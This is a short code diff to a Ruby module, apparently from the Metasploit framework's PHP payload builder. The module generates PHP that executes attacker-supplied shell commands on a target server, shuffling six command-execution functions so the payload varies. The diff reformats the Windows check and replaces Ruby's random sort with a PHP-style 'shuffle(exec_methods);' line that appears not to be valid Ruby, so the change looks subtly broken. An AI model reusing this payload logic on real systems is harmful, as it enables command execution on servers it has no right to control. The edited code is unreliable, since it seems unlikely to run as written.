@@ -69,7 +69,7 @@ module Msf::Payload::Php
     in_array    = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
 
     setup = "
-      if (FALSE !== stristr(PHP_OS, 'win' )) {
+      if (FALSE!==stristr(PHP_OS,'win')){
         #{cmd}=#{cmd}.\" 2>&1\\n\";
       }
       #{is_callable}='is_callable';
@@ -134,7 +134,8 @@ module Msf::Payload::Php
       }
     "
 
-    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen].sort_by { rand }
+    exec_methods = [passthru, shell_exec, system, exec, proc_open, popen];
+    shuffle(exec_methods);
     buf = setup + exec_methods.join("") + fail_block
     #buf = Rex::Text.compress(buf)
 
